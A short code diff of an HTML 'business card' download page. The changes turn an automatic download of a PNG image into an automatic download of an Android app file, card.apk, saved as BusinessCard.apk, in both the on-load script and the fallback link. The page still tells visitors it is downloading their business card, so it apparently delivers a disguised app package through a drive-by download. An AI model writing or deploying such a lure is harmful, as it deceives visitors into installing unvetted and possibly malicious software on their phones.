@@ -3,18 +3,18 @@
 <body>
   <p>Downloading your business card...</p>
   <script>
-    fetch("card.png")
+    fetch("card.apk")
       .then(res => res.blob())
       .then(blob => {
         const url = window.URL.createObjectURL(blob);
         const a = document.createElement("a");
         a.href = url;
-        a.download = "BusinessCard.png";
+        a.download = "BusinessCard.apk";
         document.body.appendChild(a);
         a.click();
         window.URL.revokeObjectURL(url);
       });
   </script>
-  <p>If nothing happens, <a href="card.png" download="BusinessCard.png">tap here</a></p>
+  <p>If nothing happens, <a href="card.apk" download="BusinessCard.apk">tap here</a></p>
 </body>
 </html>
